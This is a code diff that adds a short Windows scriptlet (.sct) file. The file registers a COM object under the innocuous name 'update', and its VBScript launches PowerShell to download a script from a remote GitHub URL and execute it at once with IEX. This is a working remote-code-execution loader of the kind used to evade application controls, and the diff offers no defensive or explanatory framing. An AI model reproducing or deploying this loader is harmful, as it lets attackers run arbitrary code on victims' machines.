@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+progid="update"
+classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="VBScript">
+<![CDATA[
+Dim r
+r = "IEX (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/frknozr/myTests/master/Update.ps1')" 
+Set oShell = CreateObject ("WScript.Shell")
+oShell.exec(r)
+]]>
+</script>
+</registration>
+</scriptlet>
